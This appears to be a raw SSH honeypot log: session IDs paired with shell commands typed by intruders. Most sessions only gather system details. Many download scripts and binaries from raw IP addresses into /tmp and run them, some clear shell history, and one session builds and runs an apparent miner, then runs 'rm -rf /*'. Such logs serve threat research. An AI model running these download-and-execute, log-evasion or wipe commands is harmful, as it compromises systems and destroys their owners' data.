6575c97eeb3d4ea491f9d20d9708b73b	uname
6575c97eeb3d4ea491f9d20d9708b73b	free -m
6575c97eeb3d4ea491f9d20d9708b73b	ps x
7b57cffc4f3e451b87c5985cf5925ca3	uname
7b57cffc4f3e451b87c5985cf5925ca3	free -m
7b57cffc4f3e451b87c5985cf5925ca3	ps x
25040b6e171e4942a0217611570d6246	uname
25040b6e171e4942a0217611570d6246	free -m
25040b6e171e4942a0217611570d6246	ps x
cc7e15aaa41143189e93853834260f44	uname
cc7e15aaa41143189e93853834260f44	free -m
cc7e15aaa41143189e93853834260f44	ps x
33437fbdcb9b40fb9262ca585c334d3f	uname
33437fbdcb9b40fb9262ca585c334d3f	free -m
33437fbdcb9b40fb9262ca585c334d3f	ps x
daad778282fd42abaafc614dc8436c44	uname
daad778282fd42abaafc614dc8436c44	free -m
daad778282fd42abaafc614dc8436c44	ps x
0f091fd1e6fa4c758b1fe202e5bb1304	uname
0f091fd1e6fa4c758b1fe202e5bb1304	free -m
0f091fd1e6fa4c758b1fe202e5bb1304	ps x
3f5ffcfa290d4c18ba3d1ef6fe702860	uname
3f5ffcfa290d4c18ba3d1ef6fe702860	free -m
3f5ffcfa290d4c18ba3d1ef6fe702860	ps x
38dac795e56c498487f79215f23b1190	wget http://185.17.30.239/gb.sh -O /dev/gb.sh
59a5f233723a41388ac0788f6deedf3d	unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
59a5f233723a41388ac0788f6deedf3d	history -n
59a5f233723a41388ac0788f6deedf3d	exit
29b38ceba4b54b40ace5be844c3d4f2d	unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
29b38ceba4b54b40ace5be844c3d4f2d	history -n
29b38ceba4b54b40ace5be844c3d4f2d	exit
e6a051cfc1ac4b2da680f067c1bc5e80	cd /tmp
e6a051cfc1ac4b2da680f067c1bc5e80	wget http://45.32.232.197/get.sh --quiet
251d3d51f76649f682ff22e7c2b44ef0	cd /tmp
251d3d51f76649f682ff22e7c2b44ef0	wget http://185.130.5.246/bin3.sh --quiet
8f1a645cdd0944479dc7c29299cb87ec	cd /tmp
8f1a645cdd0944479dc7c29299cb87ec	wget http://185.130.5.246/bin3.sh --quiet
d6fb1861b67d4711a5f316e56f537078	cd /tmp
d6fb1861b67d4711a5f316e56f537078	wget http://45.32.232.197/get.sh --quiet
a6da6ad24c744d26abf5654abe16fe85	wget -c http://23.247.5.22:2016/1111
53239610f3a24683be460e571b090ce0	cd /tmp
53239610f3a24683be460e571b090ce0	wget http://45.32.232.197/get.sh --quiet
6f9f7444160f49f08ee2297c00cf0004	cd /tmp
6f9f7444160f49f08ee2297c00cf0004	wget http://185.130.5.246/bin3.sh --quiet
bcd39b8683f445dba7c5becf90cf29db	cd /tmp
bcd39b8683f445dba7c5becf90cf29db	wget http://185.130.5.246/bin3.sh --quiet
8e5aaeb7e71a45f98f0f36d682755579	cd /tmp
8e5aaeb7e71a45f98f0f36d682755579	wget http://185.130.5.246/bin3.sh --quiet
af3c27c6647741d8882ee77cceb345c9	cd /tmp
af3c27c6647741d8882ee77cceb345c9	wget http://45.32.232.197/get.sh --quiet
161e8d586928437497deed8b89adb3bc	curl -o /tmp/25002 http://23.234.25.140:15826/25002
161e8d586928437497deed8b89adb3bc	chmod 777 /tmp/25002
161e8d586928437497deed8b89adb3bc	/tmp/25002
f346f781d5494a69b2bb17e0913e2fe1	cd /tmp
f346f781d5494a69b2bb17e0913e2fe1	wget http://185.130.5.246/bin3.sh --quiet
1d25239a9450455791569303cac6c566	cd /tmp
1d25239a9450455791569303cac6c566	wget http://45.32.232.197/get.sh --quiet
d66f32ed726b42ee9b7c2b1675cc22e9	ls -al
d66f32ed726b42ee9b7c2b1675cc22e9	du -h *
d66f32ed726b42ee9b7c2b1675cc22e9	df -h
d66f32ed726b42ee9b7c2b1675cc22e9	ifconfig
d66f32ed726b42ee9b7c2b1675cc22e9	date
d66f32ed726b42ee9b7c2b1675cc22e9	uname
d66f32ed726b42ee9b7c2b1675cc22e9	uname -a
d66f32ed726b42ee9b7c2b1675cc22e9	ver
d66f32ed726b42ee9b7c2b1675cc22e9	cat /proc/cpuinfo
d66f32ed726b42ee9b7c2b1675cc22e9	free -m
d66f32ed726b42ee9b7c2b1675cc22e9	exit
3745e87821be4998adaf99a78e908930	cd /tmp
3745e87821be4998adaf99a78e908930	wget http://45.32.232.197/get.sh --quiet
ecf42e1325ee4ff49a3b95afa551ce76	cd /tmp
ecf42e1325ee4ff49a3b95afa551ce76	wget http://185.130.5.246/bin3.sh --quiet
b843514b86a44299897fd9740842a3f1	cd /tmp
b843514b86a44299897fd9740842a3f1	wget http://185.130.5.246/bin3.sh --quiet
b54cc287a5064615885142b6747ce396	cd /tmp
b54cc287a5064615885142b6747ce396	wget http://45.32.232.197/get.sh --quiet
c5567f99a8fa428bbb670b373ab4e989	unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
c5567f99a8fa428bbb670b373ab4e989	history -n
c5567f99a8fa428bbb670b373ab4e989	exit
631da1ee26584940b4fc5851b82b8c13	uname -r
d410edf06462453994b51978fda278a1	unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
d410edf06462453994b51978fda278a1	history -n
d410edf06462453994b51978fda278a1	exit
3f7bdc2249bf4546a01ae10b901da42a	cd /tmp
3f7bdc2249bf4546a01ae10b901da42a	wget http://185.130.5.246/bin3.sh --quiet
73cb1a700e1f497f967e9700b647ac45	cd /tmp
73cb1a700e1f497f967e9700b647ac45	wget http://45.32.232.197/get.sh --quiet
5e4a89ee4e6d49d59554f05158e8dba7	unset HISTFILE HISTLOG HISTORY
5e4a89ee4e6d49d59554f05158e8dba7	uname -a
5e4a89ee4e6d49d59554f05158e8dba7	uptime
5e4a89ee4e6d49d59554f05158e8dba7	who
5e4a89ee4e6d49d59554f05158e8dba7	ifconfig
5e4a89ee4e6d49d59554f05158e8dba7	cd /var/tmp/
5e4a89ee4e6d49d59554f05158e8dba7	ls
5e4a89ee4e6d49d59554f05158e8dba7	mkdir " "
5e4a89ee4e6d49d59554f05158e8dba7	cd " "
5e4a89ee4e6d49d59554f05158e8dba7	ps x
5e4a89ee4e6d49d59554f05158e8dba7	wget -O speedtest-cli https://raw.github.com/sivel/speedtest-cli/master/speedtest_cli.py --no-check-certificate
5e4a89ee4e6d49d59554f05158e8dba7	chmod +x speedtest-cli
5e4a89ee4e6d49d59554f05158e8dba7	./speedtest-cli
5e4a89ee4e6d49d59554f05158e8dba7	wget ovh.net/files/1Gb.dat
5e4a89ee4e6d49d59554f05158e8dba7	gcc
5e4a89ee4e6d49d59554f05158e8dba7	wget irssi.in/kn
5e4a89ee4e6d49d59554f05158e8dba7	wget 23.226.231.136/kn
5e4a89ee4e6d49d59554f05158e8dba7	chmod +x kn
5e4a89ee4e6d49d59554f05158e8dba7	./kn
5e4a89ee4e6d49d59554f05158e8dba7	rm kn
5e4a89ee4e6d49d59554f05158e8dba7	wget 23.226.231.136/c.c
5e4a89ee4e6d49d59554f05158e8dba7	gcc c.c -o cpu
5e4a89ee4e6d49d59554f05158e8dba7	ls
5e4a89ee4e6d49d59554f05158e8dba7	rm c.c
5e4a89ee4e6d49d59554f05158e8dba7	./cpu
5e4a89ee4e6d49d59554f05158e8dba7	who
5e4a89ee4e6d49d59554f05158e8dba7	ss
5e4a89ee4e6d49d59554f05158e8dba7	last-a
5e4a89ee4e6d49d59554f05158e8dba7	last -a
5e4a89ee4e6d49d59554f05158e8dba7	up
5e4a89ee4e6d49d59554f05158e8dba7	uptime
5e4a89ee4e6d49d59554f05158e8dba7	apt-get upgrade
5e4a89ee4e6d49d59554f05158e8dba7	cd
5e4a89ee4e6d49d59554f05158e8dba7	rn -rf /*
5e4a89ee4e6d49d59554f05158e8dba7	rm -rf /*
5e4a89ee4e6d49d59554f05158e8dba7	ls
647435c797c74feeaf641efb6363c16f	cd /tmp
647435c797c74feeaf641efb6363c16f	wget http://185.130.5.246/bin3.sh --quiet
63a36e88e8834012a04a3f30c0a75cb2	cd /tmp
63a36e88e8834012a04a3f30c0a75cb2	wget http://45.32.232.197/get.sh --quiet
8bd651b410b4473db2c30f4db171c8f2	echo "WinSCP: this is end-of-file:0"
12324f87401444e0960f667fae94a104	curl -o /tmp/25002 http://23.234.25.140:15826/25002
12324f87401444e0960f667fae94a104	/tmp/25002
e7ea1de14f7c4a8e9f09b10139b91094	cd /tmp
e7ea1de14f7c4a8e9f09b10139b91094	wget http://185.130.5.246/bin3.sh --quiet
0722bbb151044ffaa7f2198dfd554536	cd /tmp
0722bbb151044ffaa7f2198dfd554536	wget http://45.32.232.197/get.sh --quiet
93453ee208a646e9b8b74d7294dd74f4	curl -o /tmp/25002 http://23.234.25.140:15826/25002
93453ee208a646e9b8b74d7294dd74f4	chmod 777 /tmp/25002
93453ee208a646e9b8b74d7294dd74f4	/tmp/25002
8e8fc0638bb94cdc9c2eb7a4a7ce92b2	apt-get
94dfc2ac50e341d7879040fee37dc67d	wget http://185.17.30.239/gb.sh -O /dev/gb.sh
687841132b9842e38c592706f5c97d63	wget http://185.17.30.239/gb.sh -O /dev/gb.sh
47bfde7d93ab453ca813d1a232cc8030	cd /tmp
47bfde7d93ab453ca813d1a232cc8030	wget http://185.130.5.246/bin3.sh --quiet
58f95a6b4b834c9a9a244051e9574985	cd /tmp
58f95a6b4b834c9a9a244051e9574985	wget http://45.32.232.197/get.sh --quiet
7e3b5f9d4b3f4c198665505bb8d800a7	id
1cbdde18f114402599049f65ca6cd874	id
9c81eb492ad242deab8a665b28a6824a	cd /tmp
9c81eb492ad242deab8a665b28a6824a	wget http://45.32.232.197/get.sh --quiet
bfcc8d476f6a4f5a9cfc2ca123343b16	cd /tmp
bfcc8d476f6a4f5a9cfc2ca123343b16	wget http://185.130.5.246/bin3.sh --quiet
850e840782974d3985e6b00a1e7180f0	cd /tmp
850e840782974d3985e6b00a1e7180f0	wget http://185.130.5.246/bin3.sh --quiet
9d04bc1061ae4503bbbee098944049e5	cd /tmp
9d04bc1061ae4503bbbee098944049e5	wget http://45.32.232.197/get.sh --quiet
dffb0e51e2b94885b2a6622ba928adae	cd /tmp
dffb0e51e2b94885b2a6622ba928adae	wget http://185.130.5.246/bin3.sh --quiet
535c984417184449a26108880b9274aa	cd /tmp
535c984417184449a26108880b9274aa	wget http://45.32.232.197/get.sh --quiet
4b926927c9ea400cb6b5b355a3c71b18	wget http://185.17.30.239/gb.sh -O /dev/gb.sh
64859d5d41954e8684326ec5ca85f061	cd /tmp
64859d5d41954e8684326ec5ca85f061	wget http://185.130.5.246/bin3.sh --quiet
c181037451414ae896818910d7c44da6	cd /tmp
c181037451414ae896818910d7c44da6	wget http://45.32.232.197/get.sh --quiet
4ea2649eac454cffbbf8084f384457b2	cd /tmp
4ea2649eac454cffbbf8084f384457b2	wget http://45.32.232.197/get.sh --quiet
dd713041f692465b875a5632620a5cf6	wget http://185.17.30.239/gb.sh -O /dev/gb.sh
61525f6734a144299283facef26fe627	wget http://185.17.30.239/gb.sh -O /dev/gb.sh
22c7928209034b60a28db85f0a26bccb	wget http://185.17.30.239/gb.sh -O /dev/gb.sh
dd0139f544bd40d1a8261084cc74223f	uname
dd0139f544bd40d1a8261084cc74223f	free -m
dd0139f544bd40d1a8261084cc74223f	ps x
33bbf63225d6432d958f25f45ab46ea6	uname
33bbf63225d6432d958f25f45ab46ea6	free -m
33bbf63225d6432d958f25f45ab46ea6	ps x
641e57d13cdb4c5fa7cbb04e83eb4d07	uname
641e57d13cdb4c5fa7cbb04e83eb4d07	free -m
641e57d13cdb4c5fa7cbb04e83eb4d07	ps x
9f1c03691b2949af82fe246d4c988af1	uname
9f1c03691b2949af82fe246d4c988af1	free -m
9f1c03691b2949af82fe246d4c988af1	ps x
0b685d9465bf4030877c03ee72e9b50b	uname
0b685d9465bf4030877c03ee72e9b50b	free -m
0b685d9465bf4030877c03ee72e9b50b	ps x
be4549dbfc3e490fb91fdcc7ae5d1c5b	uname
be4549dbfc3e490fb91fdcc7ae5d1c5b	free -m
be4549dbfc3e490fb91fdcc7ae5d1c5b	ps x
8aaf2d9ccaa54f818eef855c2120e161	uname
8aaf2d9ccaa54f818eef855c2120e161	free -m
8aaf2d9ccaa54f818eef855c2120e161	ps x
f03ac4b79b224ebea401cf959f5c5ea3	uname
f03ac4b79b224ebea401cf959f5c5ea3	free -m
f03ac4b79b224ebea401cf959f5c5ea3	ps x
3d7e5810d4224a95a09d83df85fb2241	uname
3d7e5810d4224a95a09d83df85fb2241	free -m
3d7e5810d4224a95a09d83df85fb2241	ps x
bda85dfb437f48249251fc1cc2acc237	uname
bda85dfb437f48249251fc1cc2acc237	free -m
bda85dfb437f48249251fc1cc2acc237	ps x
957590db9b004cc49357f703e1a3bbcc	uname
957590db9b004cc49357f703e1a3bbcc	free -m
957590db9b004cc49357f703e1a3bbcc	ps x
d787c73e65154716af3081f19d1355b7	uname
d787c73e65154716af3081f19d1355b7	free -m
d787c73e65154716af3081f19d1355b7	ps x
ed73daa7810249439820e1555dc8a468	uname
ed73daa7810249439820e1555dc8a468	free -m
ed73daa7810249439820e1555dc8a468	ps x
980ae8aff0bd4a13ba63c9f309bd79a5	uname
980ae8aff0bd4a13ba63c9f309bd79a5	free -m
980ae8aff0bd4a13ba63c9f309bd79a5	ps x
dd86a66ab1354061bf43aabc59b8afd8	uname
dd86a66ab1354061bf43aabc59b8afd8	free -m
dd86a66ab1354061bf43aabc59b8afd8	ps x
441ba510aae7455c93c1e3783000c957	uname
441ba510aae7455c93c1e3783000c957	free -m
441ba510aae7455c93c1e3783000c957	ps x
dc08df8814a443c3b1222bd33af6e710	curl -o /tmp/25002 http://23.234.25.140:15826/25002
4413915aa20448d7acb68ff561d58c4d	uname
4413915aa20448d7acb68ff561d58c4d	free -m
4413915aa20448d7acb68ff561d58c4d	ps x
a429952c7e064812820fd52efaf02f8a	uname
a429952c7e064812820fd52efaf02f8a	free -m
a429952c7e064812820fd52efaf02f8a	ps x
2ec05f1e780f4757b56c967426f66232	uname
2ec05f1e780f4757b56c967426f66232	free -m
2ec05f1e780f4757b56c967426f66232	ps x
e1f27b172ff94a08ad949505ac3dc9a8	uname
e1f27b172ff94a08ad949505ac3dc9a8	free -m
e1f27b172ff94a08ad949505ac3dc9a8	ps x
e361ea16361442079b973699ba4f8153	uname
e361ea16361442079b973699ba4f8153	free -m
e361ea16361442079b973699ba4f8153	ps x
d66830b1191044baa87b8f05e147376b	uname
d66830b1191044baa87b8f05e147376b	free -m
d66830b1191044baa87b8f05e147376b	ps x
34ea23c6181e4304a7dd83dcc4df7de4	uname
34ea23c6181e4304a7dd83dcc4df7de4	free -m
34ea23c6181e4304a7dd83dcc4df7de4	ps x
e4040a2d68334b389cb9e635a74fd7f5	uname
e4040a2d68334b389cb9e635a74fd7f5	free -m
e4040a2d68334b389cb9e635a74fd7f5	ps x
922ac412916a4abaaedf1a5564f2c77e	uname
922ac412916a4abaaedf1a5564f2c77e	free -m
922ac412916a4abaaedf1a5564f2c77e	ps x
07de6190b5e5404fa9072b3280a0afc8	uname
07de6190b5e5404fa9072b3280a0afc8	free -m
07de6190b5e5404fa9072b3280a0afc8	ps x
22b0d154c03d4762a8bd85f68d23905e	uname
22b0d154c03d4762a8bd85f68d23905e	free -m
22b0d154c03d4762a8bd85f68d23905e	ps x
a26cb744c52843419c52941eccae4cbe	uname
a26cb744c52843419c52941eccae4cbe	free -m
a26cb744c52843419c52941eccae4cbe	ps x
18fc4f29315946338b6e5e03c6a7c654	uname
18fc4f29315946338b6e5e03c6a7c654	free -m
18fc4f29315946338b6e5e03c6a7c654	ps x
92508eb4e8e845f781ba5e3fde256fd0	uname
92508eb4e8e845f781ba5e3fde256fd0	free -m
92508eb4e8e845f781ba5e3fde256fd0	ps x
d75aa1dbc19944c5a1a66fc13a69d651	uname
d75aa1dbc19944c5a1a66fc13a69d651	free -m
d75aa1dbc19944c5a1a66fc13a69d651	ps x
a326883f403741f88ebeaa432ce15a87	uname
a326883f403741f88ebeaa432ce15a87	free -m
a326883f403741f88ebeaa432ce15a87	ps x
17d305e5bbf44373bd2fcf8a159d3d84	curl -o /tmp/25002 http://23.234.25.140:15826/25002
17d305e5bbf44373bd2fcf8a159d3d84	/tmp/25002
32a0f4ce9b0f4fc39a000b58f97ee1e8	uname
32a0f4ce9b0f4fc39a000b58f97ee1e8	free -m
32a0f4ce9b0f4fc39a000b58f97ee1e8	ps x
0950bb580e1a4827bacc7edd0f65300f	uname
0950bb580e1a4827bacc7edd0f65300f	free -m
0950bb580e1a4827bacc7edd0f65300f	ps x
6d5a6b4410fc493e8e047bfb68fe863d	uname
6d5a6b4410fc493e8e047bfb68fe863d	free -m
6d5a6b4410fc493e8e047bfb68fe863d	ps x
11717cd5608643dfa709bfd86a8eda78	uname
11717cd5608643dfa709bfd86a8eda78	free -m
11717cd5608643dfa709bfd86a8eda78	ps x
f1358e1bc88e4cf3b6268b9965ac30b3	uname
f1358e1bc88e4cf3b6268b9965ac30b3	free -m
f1358e1bc88e4cf3b6268b9965ac30b3	ps x
89036fee0e2447f08fa3ea143e6ee4a8	uname
89036fee0e2447f08fa3ea143e6ee4a8	free -m
89036fee0e2447f08fa3ea143e6ee4a8	ps x
cd7a82ea898d4549a0af5601f35a350d	uname
cd7a82ea898d4549a0af5601f35a350d	free -m
cd7a82ea898d4549a0af5601f35a350d	ps x
2fd1707fd29149ada2cec2f78d611d2e	uname
2fd1707fd29149ada2cec2f78d611d2e	free -m
2fd1707fd29149ada2cec2f78d611d2e	ps x
6647b603d8cb4f5781ff816b9b1a4184	uname
6647b603d8cb4f5781ff816b9b1a4184	free -m
6647b603d8cb4f5781ff816b9b1a4184	ps x
16ae6724d9fd4f9fa158e2a6fb85d205	uname
16ae6724d9fd4f9fa158e2a6fb85d205	free -m
16ae6724d9fd4f9fa158e2a6fb85d205	ps x
1dee3f1d09d54f0e8e9bacb862bb33f5	uname
1dee3f1d09d54f0e8e9bacb862bb33f5	free -m
1dee3f1d09d54f0e8e9bacb862bb33f5	ps x
5720fb52b1624f6ca4a6af9131cfba0c	uname
5720fb52b1624f6ca4a6af9131cfba0c	free -m
5720fb52b1624f6ca4a6af9131cfba0c	ps x
024b9cdda0804d38b827c471abca2a92	uname
024b9cdda0804d38b827c471abca2a92	free -m
024b9cdda0804d38b827c471abca2a92	ps x
8c84344f14f8412a85acfff6e55a1cfc	uname
8c84344f14f8412a85acfff6e55a1cfc	free -m
8c84344f14f8412a85acfff6e55a1cfc	ps x
cfd2bcf7478b4aa88a94dc4f66bd1304	uname
cfd2bcf7478b4aa88a94dc4f66bd1304	free -m
cfd2bcf7478b4aa88a94dc4f66bd1304	ps x
23235237a8354ec5bc792d5562cca529	uname
23235237a8354ec5bc792d5562cca529	free -m
23235237a8354ec5bc792d5562cca529	ps x
4247b61045394204b97c6b4c29fe4f2d	uname
4247b61045394204b97c6b4c29fe4f2d	free -m
4247b61045394204b97c6b4c29fe4f2d	ps x
82683bbb0c314bf8b6bca5a4ab8d3972	uname
82683bbb0c314bf8b6bca5a4ab8d3972	free -m
82683bbb0c314bf8b6bca5a4ab8d3972	ps x
1e124190737840ca9148194be8c9706f	uname
1e124190737840ca9148194be8c9706f	free -m
1e124190737840ca9148194be8c9706f	ps x
6a76f995a4bf414baec7fb72d0c47b9e	uname
6a76f995a4bf414baec7fb72d0c47b9e	free -m
6a76f995a4bf414baec7fb72d0c47b9e	ps x
042271621b164058a8d1d6ab6172389c	uname
042271621b164058a8d1d6ab6172389c	free -m
042271621b164058a8d1d6ab6172389c	ps x
068dbb881631462b971a1666c7459cea	uname
068dbb881631462b971a1666c7459cea	free -m
068dbb881631462b971a1666c7459cea	ps x
15c4344551c14a14a993757c2f31c6e3	uname
15c4344551c14a14a993757c2f31c6e3	free -m
15c4344551c14a14a993757c2f31c6e3	ps x
0999722b05b14e82b2a5f84b9dddd769	uname
0999722b05b14e82b2a5f84b9dddd769	free -m
0999722b05b14e82b2a5f84b9dddd769	ps x
7d88dc0cbec44fd594beb72a93784eb2	uname
7d88dc0cbec44fd594beb72a93784eb2	free -m
7d88dc0cbec44fd594beb72a93784eb2	ps x
ac888290f64c4372be4862e43cd71a4e	uname
ac888290f64c4372be4862e43cd71a4e	free -m
ac888290f64c4372be4862e43cd71a4e	ps x
6118df6a0192472ea8158df5a336d380	uname
6118df6a0192472ea8158df5a336d380	free -m
6118df6a0192472ea8158df5a336d380	ps x
c1e59a1dd7184e27b1d785ad17ffe307	uname
c1e59a1dd7184e27b1d785ad17ffe307	free -m
c1e59a1dd7184e27b1d785ad17ffe307	ps x
f2c58884a63a40479c0ef3e498d299cc	uname
f2c58884a63a40479c0ef3e498d299cc	free -m
f2c58884a63a40479c0ef3e498d299cc	ps x
d67a1c542fc04ab8933934729b14539d	uname
d67a1c542fc04ab8933934729b14539d	free -m
d67a1c542fc04ab8933934729b14539d	ps x
33b492257ccf4ef7ad8186c1b3fb9829	uname
33b492257ccf4ef7ad8186c1b3fb9829	free -m
33b492257ccf4ef7ad8186c1b3fb9829	ps x
feb0202a776441aabb8d768828fa280a	uname
feb0202a776441aabb8d768828fa280a	free -m
feb0202a776441aabb8d768828fa280a	ps x
1135a63a7f7e40a69dad30d8f05477e2	uname
1135a63a7f7e40a69dad30d8f05477e2	free -m
1135a63a7f7e40a69dad30d8f05477e2	ps x
f9bfa7ae9675478f9b218a06a6a2e93c	uname
f9bfa7ae9675478f9b218a06a6a2e93c	free -m
f9bfa7ae9675478f9b218a06a6a2e93c	ps x
fe9f243f908847699b6d6b226062fe93	uname
fe9f243f908847699b6d6b226062fe93	free -m
fe9f243f908847699b6d6b226062fe93	ps x
1715ecb20b1f4d2fa5679816fe45d36e	uname
1715ecb20b1f4d2fa5679816fe45d36e	free -m
1715ecb20b1f4d2fa5679816fe45d36e	ps x
44ee488c3e384464832c6eae783043ee	uname
44ee488c3e384464832c6eae783043ee	free -m
44ee488c3e384464832c6eae783043ee	ps x
7fbeb42d7c7d40409f6e83c9487040ac	uname
7fbeb42d7c7d40409f6e83c9487040ac	free -m
7fbeb42d7c7d40409f6e83c9487040ac	ps x
7396187412ae447ebaf414a1f72ea949	uname
7396187412ae447ebaf414a1f72ea949	free -m
7396187412ae447ebaf414a1f72ea949	ps x
8676b9fe67a44de58b0485802a88f4e7	uname
8676b9fe67a44de58b0485802a88f4e7	free -m
8676b9fe67a44de58b0485802a88f4e7	ps x
4f89d11f60f64b35b50cee1ffa2f7fda	uname
4f89d11f60f64b35b50cee1ffa2f7fda	free -m
4f89d11f60f64b35b50cee1ffa2f7fda	ps x
bd03ce6382ea474a9677f304c50d686a	uname
bd03ce6382ea474a9677f304c50d686a	free -m
bd03ce6382ea474a9677f304c50d686a	ps x
365bdd4dd97d4135b5af0d23c9d451ae	uname
365bdd4dd97d4135b5af0d23c9d451ae	free -m
365bdd4dd97d4135b5af0d23c9d451ae	ps x
c00b2fa4daa6461fa04c9b67040b66b4	uname
c00b2fa4daa6461fa04c9b67040b66b4	free -m
c00b2fa4daa6461fa04c9b67040b66b4	ps x
6db2dd0542084ecabb9b80ef9c1fb09b	uname
6db2dd0542084ecabb9b80ef9c1fb09b	free -m
6db2dd0542084ecabb9b80ef9c1fb09b	ps x
ee5a6a082a5f485cbbf39d2a242e41e5	uname
ee5a6a082a5f485cbbf39d2a242e41e5	free -m
ee5a6a082a5f485cbbf39d2a242e41e5	ps x
49176e127e9b435b852c0c76e820828d	uname
49176e127e9b435b852c0c76e820828d	free -m
49176e127e9b435b852c0c76e820828d	ps x
60c5c89787e1485e8c1d4e78f482d947	uname
60c5c89787e1485e8c1d4e78f482d947	free -m
60c5c89787e1485e8c1d4e78f482d947	ps x
234b0070b39d4bf48cca50fd6baf22d1	uname
234b0070b39d4bf48cca50fd6baf22d1	free -m
234b0070b39d4bf48cca50fd6baf22d1	ps x
dc0f7927cf9a429fa60dfe214b260f2b	uname
dc0f7927cf9a429fa60dfe214b260f2b	free -m
dc0f7927cf9a429fa60dfe214b260f2b	ps x
ca45f7cee90244558432b1cc78b711f5	uname
ca45f7cee90244558432b1cc78b711f5	free -m
ca45f7cee90244558432b1cc78b711f5	ps x
fae06b6f50af40f1ac8aa1291056db3b	uname
fae06b6f50af40f1ac8aa1291056db3b	free -m
fae06b6f50af40f1ac8aa1291056db3b	ps x
8a5f54dbf22241f1975e815fa0b5d2d9	uname
8a5f54dbf22241f1975e815fa0b5d2d9	free -m
8a5f54dbf22241f1975e815fa0b5d2d9	ps x
e371a0f8c2494ce18e06663c4502a04a	uname
e371a0f8c2494ce18e06663c4502a04a	free -m
e371a0f8c2494ce18e06663c4502a04a	ps x
30def629be904f1c85bf95206f945e3f	uname
30def629be904f1c85bf95206f945e3f	free -m
30def629be904f1c85bf95206f945e3f	ps x
c9e58c512ee141bda6bb186af7dd29ac	uname
c9e58c512ee141bda6bb186af7dd29ac	free -m
c9e58c512ee141bda6bb186af7dd29ac	ps x
0743ec38548c4fd4a16df3b24817052a	uname
0743ec38548c4fd4a16df3b24817052a	free -m
0743ec38548c4fd4a16df3b24817052a	ps x
ef16ff3e5e7441a5bfd936e9ac730360	uname
ef16ff3e5e7441a5bfd936e9ac730360	free -m
ef16ff3e5e7441a5bfd936e9ac730360	ps x
928ef4a7a8644521b1ea558bab404512	uname
928ef4a7a8644521b1ea558bab404512	free -m
928ef4a7a8644521b1ea558bab404512	ps x
d5c2e9a1f6074c13be9cc2a46c9aa97f	uname
d5c2e9a1f6074c13be9cc2a46c9aa97f	free -m
d5c2e9a1f6074c13be9cc2a46c9aa97f	ps x
b1cb5bec0e134875984afac8099e4db4	uname
b1cb5bec0e134875984afac8099e4db4	free -m
b1cb5bec0e134875984afac8099e4db4	ps x
5dfebdac74164ff5b612061d98c2b5c3	uname
5dfebdac74164ff5b612061d98c2b5c3	free -m
5dfebdac74164ff5b612061d98c2b5c3	ps x
5647a6b5c1f74a82846c80d1c87c151f	uname
5647a6b5c1f74a82846c80d1c87c151f	free -m
5647a6b5c1f74a82846c80d1c87c151f	ps x
26c113a29053472da14b6f74f0825750	uname
26c113a29053472da14b6f74f0825750	free -m
26c113a29053472da14b6f74f0825750	ps x
db7bd01f68df46daa73cca7feead6a10	uname
db7bd01f68df46daa73cca7feead6a10	free -m
db7bd01f68df46daa73cca7feead6a10	ps x
a696f342fbe64338b0dbd8efac31cc1d	uname
a696f342fbe64338b0dbd8efac31cc1d	free -m
a696f342fbe64338b0dbd8efac31cc1d	ps x
35684e833d8842499eab8bbb7962e72d	uname
35684e833d8842499eab8bbb7962e72d	free -m
35684e833d8842499eab8bbb7962e72d	ps x
811cd42dddda42528e74453171b5583b	uname
811cd42dddda42528e74453171b5583b	free -m
811cd42dddda42528e74453171b5583b	ps x
0dcca7feeca4420597fab9f0c67c9bfa	uname
0dcca7feeca4420597fab9f0c67c9bfa	free -m
0dcca7feeca4420597fab9f0c67c9bfa	ps x
c81a0be6b6274753bfa6ac7b89e716f2	uname
c81a0be6b6274753bfa6ac7b89e716f2	free -m
c81a0be6b6274753bfa6ac7b89e716f2	ps x
b887ef3cd4284d85920602914d41681f	uname
b887ef3cd4284d85920602914d41681f	free -m
b887ef3cd4284d85920602914d41681f	ps x
a0b77a60744b4bd5b8c9e1f85bdee676	uname
a0b77a60744b4bd5b8c9e1f85bdee676	free -m
a0b77a60744b4bd5b8c9e1f85bdee676	ps x
61bcdcc945bc46d083485512212315c2	uname
61bcdcc945bc46d083485512212315c2	free -m
61bcdcc945bc46d083485512212315c2	ps x
57c85ae3c3c24c278c420d07b235c899	uname
57c85ae3c3c24c278c420d07b235c899	free -m
57c85ae3c3c24c278c420d07b235c899	ps x
